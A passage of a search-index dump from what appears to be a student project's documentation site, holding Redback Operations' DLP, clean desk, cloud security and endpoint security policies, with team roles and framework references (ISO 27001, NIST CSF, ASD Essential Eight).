The least privilege principle must be implemented, restricting access rights to only those that directly require access to perform their job function. Additionally, role-based access controls can be implemented for team-related work, assigning the same access permissions to a group of people, meaning those with the same assigned role can access the same levels of information. By doing so, sensitive, and important data can therefore be protected through the limitation of access.  ","version":"Next","tagName":"h3"},{"title":"Watermarking Content​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#watermarking-content","content":" All confidential information that is integral to the company should be watermarked with “RedBack Operations”. This prevents the ability for anyone to steal any data or documentation and claim it as their own as the “RedBack Operations” branding will be visible across the entire document. This also enables the ability to track any potential data breaches if any copyrighted information of RedBack Operations is found online.  ","version":"Next","tagName":"h3"},{"title":"Encryption​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#encryption","content":" All sensitive material within Redback Operations should undergo encryption to reduce the overall business impact in the event of a data breach. Data encryption must be applied to all sensitive data while in storage and in transit. Though only those with the correct access controls should have access to information on how to decrypt the data, limiting the access of the encrypted data to only those that are required to use it. Further encryption methods and strategies are listed in our cryptography policy.  ","version":"Next","tagName":"h3"},{"title":"Preventing Unauthorized Copies of Data​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#preventing-unauthorized-copies-of-data","content":" Tying in with Access Controls and Watermarking Content, to prevent unauthorized copies of data, access controls must be in place to ensure only those who are trusted with sensitive material can access it, and if there were to be copies made, it will have a Redback Operations watermark across the entire document or string of data. Moreover, screen-capture prevention and clipboard control should be implemented to both, prevent the possibility of a screen recording/screenshot or to prevent a clipboard copy of the data.  ","version":"Next","tagName":"h3"},{"title":"Content Inspection​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#content-inspection","content":" Content inspection involves regular examination of files, documents, and automated monitoring of communications (internal/external), such as emails to detect any sensitive or unauthorized information that plays a pivotal role to Redback Operations.  Automated monitoring through key word, pattern, or file type scans should take place to ensure that this sensitive or unauthorized data is not published or released to those without authorization. If this is detected, systems should be in place to either block or destroy the content being transmitted to therefore prevent data leaks.  ","version":"Next","tagName":"h3"},{"title":"Policy Enforcement​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#policy-enforcement","content":" Policy Enforcement acts as an overseeing body for all DLP Policies in Redback Operations. To adhere to this, there should be both automated and physical inspections on all sensitive data being transmitted or stored within Redback Operations to ensure that it follows all DLP and Data Classification Policies. Moreover, regular audits can take place to assess how effective the policies regarding DLP and Data Classifications are, and changes can be made to actively strengthen these policies to ensure a safer systematic environment.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"DLP & Data Classification Policies","url":"/redback-documentation/docs/company-policy/ISMS/dlp-data-classification#conclusion","content":" To conclude, if all DLP and Data Classification policies that are listed in this document are always adhered to, the safety and integrity of data collected and stored by Redback Operations is guaranteed. Though regular audits should take place to actively review all policies being followed, to counteract emerging technologies and potential risks that may threaten our data. ","version":"Next","tagName":"h2"},{"title":"Clean Desk and Digital Workspace Policy","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/clean desk policy","content":"","keywords":"","version":"Next"},{"title":"SCOPE​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#scope","content":" This Clean Desk and Digital Workspace Policy applies to all participants involved in Redback Operations, including students, mentors, tutors, and unit chairs. The policy is particularly focused on the Cybersecurity Team, including SecDevOps, GRC, Blue Team, Red Team, and Infrastructure Team members, as well as leaders, co-leaders, and mentors across all projects. This policy covers all digital and physical workspaces, with a special emphasis on the secure management of virtual machines (VMs), tools such as Suricata, MQTT, SIEM, Wazuh, and Nagios, and the use of Deakin University's VPN for remote access.  ","version":"Next","tagName":"h3"},{"title":"PURPOSE​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#purpose","content":" The purpose of this policy is to ensure the smooth and secure operation of Redback’s projects by protecting sensitive information, promoting a professional and organized workspace, and minimizing the risk of data breaches. This policy supports the integrity, confidentiality, and availability of Redback's data and digital environments, with particular attention to the operations of the Cybersecurity Team.  ","version":"Next","tagName":"h3"},{"title":"OBJECTIVES​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#objectives","content":" The objectives of this Clean Desk and Digital Workspace Policy are to:  Enhance Security Posture: Protect sensitive information from unauthorized access, particularly within digital workspaces.Promote Operational Efficiency: Ensure that workspaces, both physical and digital, are organized, secure, and conducive to productivity.Ensure Regulatory Compliance: Align with data protection laws, software licensing agreements, and internal security policies.Support Incident Management: Reduce the likelihood and impact of security incidents through robust workspace practices, particularly in digital environments.  ","version":"Next","tagName":"h3"},{"title":"Definitions​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#definitions","content":" Term\tDefinitionSensitive Information\tData that must be protected from unauthorized access, including project data, participant information, and security logs. Clear Desk\tA physical workspace free of sensitive or confidential information when not in use. Clear Screen\tA digital device screen that is locked or logged off when not in use to prevent unauthorized access. Digital Workspace\tThe virtual environment in which participants interact with digital tools, applications, and data, including VMs, cloud services, and remote connections. Virtual Machine (VM)\tA software-based emulation of a computer system that provides the functionality of a physical computer. VPN (Virtual Private Network)\tA secure network connection that allows remote users to access Redback’s internal resources securely.  ","version":"Next","tagName":"h3"},{"title":"General Guidelines for Digital Workspace​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#general-guidelines-for-digital-workspace","content":" Clear Screen Requirement: All digital devices (laptops, desktops, VMs) must be locked when unattended to prevent unauthorized access. Screens should be positioned to prevent unauthorized viewing.Password Management: Use strong, unique passwords for all systems, applications, and VMs. Passwords must be changed regularly and should not be shared.Data Encryption: Sensitive information stored on local devices, VMs, or during transmission must be encrypted using company-approved encryption tools.Secure File Storage: Files should be stored on secure company servers or approved cloud services, not on local devices, to ensure data integrity and security.Software and Application Usage: Only approved software and applications, including VMs and security tools like Suricata, MQTT, SIEM, Wazuh, and Nagios, may be used. All software must be regularly updated to protect against vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"Specific Guidelines for Cybersecurity Team​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#specific-guidelines-for-cybersecurity-team","content":" Use of Deakin University VPN  Secure Connection: All members of the Cybersecurity Team must use the Deakin University VPN to securely access Redback’s internal resources, VMs, and security tools such as Wazuh and Suricata.Access Control: Access to sensitive resources through the VPN must be restricted to authorized personnel only. Regular audits should be conducted to ensure compliance.Data Transmission: All data transmitted over the VPN must be encrypted, ensuring the confidentiality and integrity of sensitive information.  Virtual Machines (VMs) and Security Tools  VM Usage: The Cybersecurity Team must ensure that all VMs are securely configured, regularly updated, and monitored for security incidents. VMs should be isolated from personal devices and used solely for Redback Operations.Suricata and MQTT: Team members using Suricata and MQTT must ensure secure configurations, with regular monitoring and alerting for potential threats. Suricata should be implemented in a way that supports intrusion detection and prevention across the network, while MQTT must be securely managed for IoT-related communication.SIEM and Wazuh Implementation: SIEM tools, along with Wazuh, must be configured to monitor, detect, and respond to security incidents in real-time. Logs should be aggregated and analyzed for potential security threats, with regular reports generated for review.Nagios and Blue Team Operations: The Blue Team, under the leadership of Devika Sivakumar, must ensure that Nagios is securely implemented within VMs for monitoring system health and detecting anomalies. Endpoint security measures should be enhanced, and regular vulnerability assessments should be conducted.  Pentesting and Red Team Activities  Simulated Attacks: The Red Team, led by MD Samsul Kabir, must conduct regular penetration testing using the VMs to identify vulnerabilities within Redback’s digital infrastructure. All findings must be documented and communicated to relevant teams for remediation.Tool Security: All pentesting tools must be securely configured and isolated within dedicated VMs to prevent accidental exposure of sensitive data or tools. Logging and MonitoringContinuous Monitoring: Tools like Suricata, SIEM, and Nagios should be configured to provide continuous monitoring of all critical systems. Alerts should be set up to notify the relevant team members immediately in case of any detected anomalies or potential breaches.Incident Response: In the event of a detected security incident, there should be a clearly defined incident response plan that involves all relevant sub-teams. The plan should include steps for isolating affected systems, investigating the root cause, mitigating the threat, and documenting the incident for future reference.  ","version":"Next","tagName":"h3"},{"title":"Digital Workspace Procedures for Remote Work​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#digital-workspace-procedures-for-remote-work","content":" Secure Home Office Setup: Home office setups must be secure, with company-provided VPNs used for accessing Redback’s network, VMs, and security tools. Sensitive work should be conducted on VMs, not on personal devices.Public Wi-Fi Precautions: Avoid using public Wi-Fi for work tasks. If necessary, use a secure VPN to access VMs and other resources.Device Security: Ensure that all devices used for remote work, particularly those connecting to VMs and security tools, are secured with strong passwords, encryption, and are regularly updated with security patches.  ","version":"Next","tagName":"h3"},{"title":"Compliance and Monitoring​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#compliance-and-monitoring","content":" Regular Audits: Conduct regular audits to ensure compliance with this policy across all teams and projects. These audits should include checks on software usage, VM security, and adherence to secure digital workspace standards.Monitoring Tools: Utilize monitoring tools, such as Suricata, SIEM, and Nagios, to continuously monitor VM and network activity, ensuring real-time detection of potential security threats.Reporting Violations: Participants are required to report any violations or concerns regarding this policy to their respective team leader or the IT department immediately.Disciplinary Actions: Non-compliance with this policy may result in disciplinary actions, including verbal or written warnings, and in severe cases, involvement of academic authorities.  ","version":"Next","tagName":"h3"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#roles-and-responsibilities","content":" Role\tResponsibilityParticipants\tAdhere to the policy and maintain secure digital workspaces. Report any security incidents or policy violations immediately. Team Leaders and Mentors\tEnforce the policy within their teams. Conduct periodic checks and support participants in understanding and complying with the policy. IT Support\tProvide tools, support, and guidelines for secure digital workspace practices. Ensure all devices and systems, including VMs, are configured according to security standards. Security Team\tDevelop, review, and update the policy. Conduct regular audits and provide training to ensure compliance. Lead incident response and remediation efforts.  ","version":"Next","tagName":"h3"},{"title":"Team-Specific Responsibilities​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#team-specific-responsibilities","content":" SecDevOps Team (Lead: Candice Smith): Implement secure development practices, ensuring that all software and applications, particularly in VMs, comply with security standards.GRC Team (Lead: Rohit): Ensure compliance with regulatory requirements and internal policies, conducting regular risk assessments focused on digital environments.Blue Team (Lead: Devika Sivakumar): Monitor and defend against potential threats in the digital workspace, focusing on Nagios, SIEM, and Wazuh implementations in VMs. Ensure endpoint security and reporting capabilities are up to date.Red Team (Lead: MD Samsul Kabir): Test and assess the security posture through simulated attacks, particularly within VMs. Provide feedback for strengthening defenses.Infrastructure Team (Lead: Drew Baker): Ensure the digital infrastructure, including VMs and cloud services, supports secure operations and adheres to the policy standards.Cybersecurity Mentor (Daniel McAulay): Oversee the integration of cybersecurity practices across all teams. Ensure continuous improvement of security measures, particularly in digital workspaces.  ","version":"Next","tagName":"h3"},{"title":"Review and Updates​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#review-and-updates","content":" This policy will be reviewed annually and updated as necessary to reflect changes in technology, business practices, or regulatory requirements. Reviews will be initiated by the Chief Information Security Officer (CISO-The Acting Director of the company/ Cybersecurity Lead/Mentor) in collaboration with team leaders.  ","version":"Next","tagName":"h3"},{"title":"Key Assets and Data Categories​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#key-assets-and-data-categories","content":" IT Assets:  Personal Laptops (Windows, Linux)Cloud Services (approved by the IT department)Company servers, VMs, and data storage solutionsSuricata, MQTT, SIEM, Wazuh, and Nagios monitoring systems Data Categories:Project-specific data (e.g., VR SunCycle, Elderly Wearable Technology, Athlete Wearable Technology, Player Tracking, BugBox)Cybersecurity data (e.g., security logs, incident reports, VM configurations, monitoring data from Suricata, MQTT, SIEM, Wazuh, and Nagios)Participant data (e.g., access logs, user credentials, compliance reports)  ","version":"Next","tagName":"h3"},{"title":"Framework References​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#framework-references","content":" This policy aligns with recognized standards and best practices, including:  ISO 27001:2022 Controls: Covering access control, operations security, network security management, and secure software development practices.CIS Controls: Encompassing inventory and control of software assets, secure configuration, continuous vulnerability management, audit log management, and incident response.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#conclusion","content":" This Clean Desk and Digital Workspace Policy provides a comprehensive framework for securing both physical and digital workspaces at Redback Operations. By adhering to this policy, participants contribute to a secure, compliant, and efficient working environment, ensuring the integrity and security of Redback's operations, particularly within the digital realm used extensively by the Cybersecurity Team.  ","version":"Next","tagName":"h3"},{"title":"Appendix​","type":1,"pageTitle":"Clean Desk and Digital Workspace Policy","url":"/redback-documentation/docs/company-policy/clean desk policy#appendix","content":" For additional guidelines and best practices, refer to the following resources:&quot;Australian Signals Directorate, Guidelines for System Hardening, May 12, 2024&quot; ","version":"Next","tagName":"h3"},{"title":"Cloud Security Policy for Redback Operations","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security","content":"","keywords":"","version":"Next"},{"title":"1. Purpose​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#1-purpose","content":" Redback Operations hosts its business-based workloads on Google Cloud Platform (GCP) and Microsoft Azure. This policy addresses gaps identified in recent Gap Analysis by implementing controls to secure the provisioning, configuration, and operation of cloud-based resources. It aligns with the NIST Cybersecurity Framework and ASD Essential Eight and provides actionable guidance for internal teams to protect data, maintain compliance, and respond effectively to threats.  ","version":"Next","tagName":"h2"},{"title":"2. Scope​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#2-scope","content":" This policy applies to all Azure and GCP resources controlled by Redback Operations, including:  Compute: Virtual Machines (VMs), Kubernetes, FunctionsStorage: Object buckets, databasesNetworking: VNETs/VPCs, subnets, firewallsIdentity: Users, service accountsPlatform Services: Managed databases, analyticsCI/CD Pipelines  ","version":"Next","tagName":"h2"},{"title":"3. Roles & Responsibilities​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#3-roles--responsibilities","content":" ","version":"Next","tagName":"h2"},{"title":"3.1 Cloud Providers​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#31-cloud-providers","content":" Secure primary infrastructure (physical, network, hypervisor).Provide built-in security tools and alerts.  ","version":"Next","tagName":"h3"},{"title":"3.2 IT Cloud Engineering​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#32-it-cloud-engineering","content":" Implement and enforce cloud controls.Provision resources using approved Infrastructure-as-Code (IaC) templates.Configure network, IAM, encryption, and backups.  ","version":"Next","tagName":"h3"},{"title":"3.3 GRC/Security Team​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#33-grcsecurity-team","content":" Establish policy, audit, monitor compliance, review designs, manage incidents, and update policy.  ","version":"Next","tagName":"h3"},{"title":"3.4 Application/Data Owners​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#34-applicationdata-owners","content":" Classify data, approve controls, and manage user access to data and applications.Participate in security reviews.  ","version":"Next","tagName":"h3"},{"title":"3.5 All Users​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#35-all-users","content":" Comply with Multi-Factor Authentication (MFA), least-privilege access, and report anomalies.Complete mandatory security training.  ","version":"Next","tagName":"h3"},{"title":"3.6 Third-Party Vendors​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#36-third-party-vendors","content":" Adhere to Redback controls when using cloud resources, use time-limited least-privilege accounts, and report incidents to Redback.  ","version":"Next","tagName":"h3"},{"title":"4. Policy Statements​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#4-policy-statements","content":" Secure Deployment Deploy all resources via audited IaC templates and approved configurations. Strong IAM Consolidate identities, mandate MFA, and use least-privilege Role-Based Access Control (RBAC). Data Protection Protect data at rest (AES-256) and in transit (TLS 1.2+). Store keys in vault services and maintain daily backups. Visibility and Response Enable fine-grained logging, aggregate logs, enable real-time alerts, and integrate with incident response. Secure DevOps Enforce secure coding, automated security scanning, and version-controlled releases. Patching and Vulnerability Management Install critical patches within 48 hours; perform periodic vulnerability scanning. Third-Party Management Vet and limit vendor access, enforce contractual security provisions, and audit transactions. Continuous Compliance Comply with NIST CSF and ASD Essential Eight, perform automated testing and scheduled audits, and address exceptions formally.  ","version":"Next","tagName":"h2"},{"title":"5. Security Controls​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#5-security-controls","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Secure Architecture and Development​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#51-secure-architecture-and-development","content":" Environment Isolation Use separate Azure subscriptions/resource groups and GCP projects for Production, Test, and Development. Segregate networks into tiered subnets. Network Controls Use Azure Network Security Groups (NSGs) and GCP VPC firewall rules to whitelist necessary traffic. Protect public endpoints with Azure Application Gateway (WAF) or GCP Cloud Armor. Hardened Configurations Use CIS-benchmarked VM images (Azure) or Shielded VMs (GCP). Enforce baseline settings with Azure Policy and GCP Organization Policies. Infrastructure-as-Code Provision all resources via ARM/Bicep (Azure) or Terraform/Deployment Manager (GCP). Include policy-as-code checks in CI pipelines. Design Reviews Require Security Team approval for significant architecture changes, with formal threat models and mitigations documented.  ","version":"Next","tagName":"h3"},{"title":"5.2 Identity and Access Management​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#52-identity-and-access-management","content":" Centralized Identities Federate GCP IAM and Azure AD with corporate IdP (SAML/SCIM). Automate account lifecycle management. MFA Enforcement Mandate MFA for all user access to portals and CLIs. Configure Azure Conditional Access and Google 2-Step Verification. Least-Privilege RBAC Grant narrowly defined roles (e.g., Storage Blob Data Reader) at the most restrictive scope. Avoid Owner/Editor roles. Privileged Access Onboard high-privilege users into Azure Privileged Identity Management (PIM) for just-in-time access; manage GCP Org admins with groups and approval workflows. Account Hygiene Enforce strong passwords, terminate accounts within 24 hours of departure, and prohibit shared accounts. IAM Monitoring Enable and monitor Azure AD sign-in/audit logs and GCP Admin Activity logs. Alert on changes to principal roles.  ","version":"Next","tagName":"h3"},{"title":"5.3 Data Protection​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#53-data-protection","content":" Classification and Labeling Tag all cloud data storage by sensitivity tier. Encryption at Rest Use platform default encryption; for sensitive data, use Customer-Managed Keys in Azure Key Vault or GCP Cloud KMS (AES-256). Encryption in Transit Use Azure Front Door/Load Balancer or GCP HTTPS Load Balancer to enforce TLS 1.2+. Secure internal traffic with mTLS or service mesh. Key and Secret Management Store keys/secrets in vault services. Implement segregation of duties, monitor usage, and rotate keys regularly. Data Loss Prevention Use DLP tools (Azure Information Protection, GCP DLP) to scan for sensitive data. Restrict public access; use signed URLs/SAS tokens that expire. Backups and Recovery Configure daily backups using Azure Backup and GCP snapshots; store in isolated environments. Encrypt backups and enable immutability/soft delete. Backup Testing and Retention Test restores every three months. Retain backups for at least 90 days; archive as per compliance needs.  ","version":"Next","tagName":"h3"},{"title":"5.4 Logging, Monitoring, and Incident Response​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#54-logging-monitoring-and-incident-response","content":" Enable Logging Enable Azure Activity Logs, NSG flow logs, resource diagnostic logs; for GCP, enable Cloud Audit Logs and VPC Flow Logs. Centralized Repository Aggregate logs into Azure Monitor/Log Analytics or GCP Cloud Logging; retain 90 days online, 1 year archived. Real-Time Alerts Use Azure Defender for Cloud, Azure Sentinel, GCP Security Command Centre, or Cloud Monitoring for policy violation and anomaly alerts. Continuous Compliance Checks Enforce via Azure Policy initiatives and GCP Organization Policies; report compliance weekly. Incident Response Integration Route notifications to Redback’s IR process; maintain runbooks for common cloud incidents (e.g., exposed storage, compromised credentials). Metrics and Reporting Track misconfigurations, remediation times, incidents, and backup success rates. Report monthly dashboards to leadership.  ","version":"Next","tagName":"h3"},{"title":"5.5 Vulnerability Management & Patching​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#55-vulnerability-management--patching","content":" OS and Host Patching Schedule monthly patching using Azure Update Management and GCP OS Config. Apply critical patches within 48 hours. Application and Dependency Updates Use managed PaaS services for automated patching. Scan containers and libraries for CVEs; redeploy/rebuild when patched. Service Versioning Track versions of managed services (AKS, GKE) and upgrade before end-of-support. Automate updates where possible. Emergency Patch Process Maintain out-of-band processes for zero-day exploits; use compensating controls as needed. Verification and Audits Implement automated reporting and quarterly manual checks for patch compliance.  ","version":"Next","tagName":"h3"},{"title":"5.6 Third-Party Integrations​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#56-third-party-integrations","content":" Vendor Assessment Conduct security questionnaires and verify certifications (SOC 2, ISO 27001) before integration. Access Control Grant time-limited, least-privilege access via service principals or guest accounts with MFA. API Security Store credentials in vaults; enforce OAuth 2.0 or signed request patterns. Limit scopes to required API operations. Marketplace and Open-Source Software Use validated Azure Marketplace and GCP Marketplace solutions. Scan and validate open-source software. Shared Responsibility Document security responsibilities between Redback and vendors. Include obligations in contracts and SLAs. Compliance Requirements Require vendors to meet encryption and logging standards; reserve the right to audit their controls.  ","version":"Next","tagName":"h3"},{"title":"6. Compliance and Governance​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#6-compliance-and-governance","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Framework Alignment​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#61-framework-alignment","content":" Controls map to NIST CSF functions—Identify (asset inventory, roles), Protect (IAM, encryption, patching), Detect (logging, monitoring), Respond (incident management), Recover (backups)—and cover all eight ASD Essential Eight mitigations.  ","version":"Next","tagName":"h3"},{"title":"6.2 Monitoring and Audits​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#62-monitoring-and-audits","content":" Automated Checks: Enforce significant controls via Azure Policy and GCP Organization Policies.Quarterly Audits: Security/GRC team audits IAM, encryption, network, and backup settings; record findings in the risk register with remediation plans.  ","version":"Next","tagName":"h3"},{"title":"6.3 Exceptions​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#63-exceptions","content":" Formal Exception Process: Document business justification, compensating controls, and duration. Obtain Security/GRC approval.Periodic Review: Revisit exceptions every six months to assess ongoing need.  ","version":"Next","tagName":"h3"},{"title":"6.4 Training and Awareness​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#64-training-and-awareness","content":" Onboarding and Annual Refreshers: Mandatory training on cloud security and controls.Ongoing Updates: Share lessons learned, new functionality, and threat advisories.  ","version":"Next","tagName":"h3"},{"title":"6.5 Reporting and Metrics​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#65-reporting-and-metrics","content":" Monthly Dashboards: Report vulnerabilities found, remediation times, incident counts, and backup success rates to IT management.Quarterly Reviews: Present cloud security posture to the Risk Committee.  ","version":"Next","tagName":"h3"},{"title":"6.6 Policy Maintenance​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#66-policy-maintenance","content":" Annual Review: Revise policy for significant cloud architecture changes or new threats.Version Control: Track changes in history and communicate updates to stakeholders.  ","version":"Next","tagName":"h3"},{"title":"6.7 Enforcement​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#67-enforcement","content":" Mandatory Compliance: Non-compliance may lead to revocation of privileges, disciplinary action, or termination per HR policy.Remediation Focus: Honest errors are addressed through coaching; deliberate violations face strict action.  ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Cloud Security Policy for Redback Operations","url":"/redback-documentation/docs/company-policy/ISMS/cloud-security#references","content":" NIST CSF ID.AM-1: Physical devices and systems inventoryNIST CSF PR.AC-1: Identity and credential managementNIST CSF PR.DS-5: Data leak protectionASD: Restricting Administrative PrivilegesASD: Patching Applications and Operating SystemsAzure Security DocumentationGoogle Cloud Security Best PracticesOWASP Top Ten ","version":"Next","tagName":"h2"},{"title":"Endpoint Security","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/endpoint","content":"","keywords":"","version":"Next"},{"title":"Version History​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#version-history","content":" Version\tModified By\tApprover\tEdited On\tChanges MadeV0.1\tKaleb Bowen 27/04/2024\tInitial document creation V1.0\tNathasha Liyanage 17/05/2025\tReview/Update  ","version":"Next","tagName":"h2"},{"title":"Purpose​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#purpose","content":" The purpose of this policy is to provide formal structure and minimum security standards for endpoint devices owned by or through direct affiliation of Redback Operations. This is to ensure security is standardised for all users, to the best possible solutions that can be offered in the varies ways that users connect to Redback digital assets.  The Endpoint Security policy will ensure the appropriate measures in place to protect users and company assets whilst ensuring that usage of these systems is not compromised by threats or overly impeded by these measures. A balance of practicality and security is essential in the ongoing protection.  The policy also intends to ensure ongoing assurance to support Redback Operations in its evolution over time, ensuring that this policy reflects the continuous needs of endpoint security, and so supporting business continuity, as well as promoting a mature security culture.  ","version":"Next","tagName":"h2"},{"title":"Scope​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#scope","content":" The scope of this policy applies to all usage of physical endpoints owned or operated by Redback Operations and its affiliated contributors. Including but not limited to laptops, desktops, phones, servers, and research devices under Redback Operations such as the smart wearables and smart bikes.  Endpoint security also extends to software ran on Redback Operations’ devices, as these have potential to cause harm to the organisation or owner of the device.  The policy will cover Redback-owned devices and contributor-owned devices separately and will be complimented by the BYOD policy for those contributor endpoints, as well as the broader Information Security Management System (ISMS) policy.  ","version":"Next","tagName":"h2"},{"title":"Definitions and References​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#definitions-and-references","content":" Primary definitions can be used from the Information Security Management System and ISO / IEC 27001. All referenced framework controls also come from ISO 27001. Additional definitions for this document:  ISMS: Information Security Management System, the primary policy document for Redback Operations.Affiliated contributors: Deakin University SIT capstone students working within the Redback Operations project.Redback-owned device: This includes devices such as exercise bikes owned by Deakin University and thus used by Redback Operations.  ","version":"Next","tagName":"h2"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#roles-and-responsibilities","content":" Roles and Responsibilities are necessary to ensure appropriate delegation of tasks, accountabilities, and responsibilities are spread to the correct stakeholders in the organisation.  ","version":"Next","tagName":"h2"},{"title":"Leadership​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#leadership","content":" Those in leadership roles have overall ownership and top level responsibility for the endpoints. Strategic decisions regarding the applicability of policies, overall security oversight, and design of the security structure are likewise a responsibility.  ","version":"Next","tagName":"h3"},{"title":"IT and Security Teams​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#it-and-security-teams","content":" Responsible for the process of design to development of implementation for the endpoint policies. This includes thorough testing of the implementation through test environments and gradual rollouts to ensure full security accountability. IT and Security must also consult with both leadership and the end users to ensure practical solutions, whilst maintaining a secure environment, built upon least privilege.  ","version":"Next","tagName":"h3"},{"title":"End Users​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#end-users","content":" End users, being the device users and / or owners, are responsible for the usage of the devices in which they own or have personal data on.  For Owners​  Owners must ensure that they are compliant in updating their device to the required software and hardware specifications determined by leadership. They must also ensure that any usage by people other than themselves is compliant with the policy.  For Users​  Users must take care when accessing Redback endpoints. Their usage must ensure that no data is compromised, and that their digital hygiene remains a high priority.  ","version":"Next","tagName":"h3"},{"title":"Physical Security​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#physical-security","content":" ","version":"Next","tagName":"h2"},{"title":"Storage​","type":1,"pageTitle":"Endpoint Security","url":"/redback-documentation/docs/company-policy/ISMS/endpoint#storage","content":" Whilst cloud storage is the preferred storage method for Redback Operations, some situations 